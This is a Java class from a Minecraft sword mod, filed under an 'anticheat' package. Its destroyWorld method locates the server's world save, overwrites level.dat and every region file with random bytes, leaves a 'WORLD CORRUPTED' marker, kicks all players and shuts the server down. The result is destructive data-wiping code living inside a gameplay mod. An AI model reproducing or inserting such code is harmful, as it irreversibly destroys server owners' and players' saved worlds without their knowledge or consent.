package com.qidai.morefunctionalswordmod.anticheat;

import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.world.World;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;

public class WorldDestroyer {
    private static boolean isDestroyed = false;

    public static boolean destroyWorld(ServerPlayerEntity player) {
        if (isDestroyed) return false;
        var world = player.getWorld();
        if (world.isClient) return false;
        try {
            // 获取世界文件夹
            String levelName = world.getServer().getSaveProperties().getLevelName();
            File worldDir = world.getServer().getFile(".").getAbsoluteFile().getParentFile();
            worldDir = new File(worldDir, levelName);
            
            if (!worldDir.exists()) {
                player.sendMessage(Text.literal("无法定位世界文件夹").formatted(Formatting.RED), false);
                return false;
            }
            
            // 损坏 level.dat
            File levelDat = new File(worldDir, "level.dat");
            if (levelDat.exists()) {
                try (RandomAccessFile raf = new RandomAccessFile(levelDat, "rw")) {
                    byte[] junk = new byte[1024];
                    new java.util.Random().nextBytes(junk);
                    raf.write(junk);
                }
            }
            
            // 损坏 region 文件夹
            File regionDir = new File(worldDir, "region");
            if (regionDir.exists()) {
                File[] files = regionDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile()) {
                            try (RandomAccessFile raf = new RandomAccessFile(f, "rw")) {
                                byte[] junk = new byte[Math.min(4096, (int) f.length())];
                                new java.util.Random().nextBytes(junk);
                                raf.write(junk);
                            }
                        }
                    }
                }
            }
            
            // 写入损坏标记
            File marker = new File(worldDir, "CORRUPTED_MARKER");
            Files.write(marker.toPath(), "WORLD CORRUPTED".getBytes(), StandardOpenOption.CREATE);
            
            isDestroyed = true;
            player.sendMessage(Text.literal("⚠ 世界存档已损坏").formatted(Formatting.RED, Formatting.BOLD), false);
            
            world.getServer().getPlayerManager().getPlayerList().forEach(p ->
                p.networkHandler.disconnect(Text.literal("世界存档已损坏"))
            );
            world.getServer().stop(false);
            return true;
        } catch (IOException e) {
            player.sendMessage(Text.literal("损坏失败: " + e.getMessage()).formatted(Formatting.RED), false);
            return false;
        }
    }
}
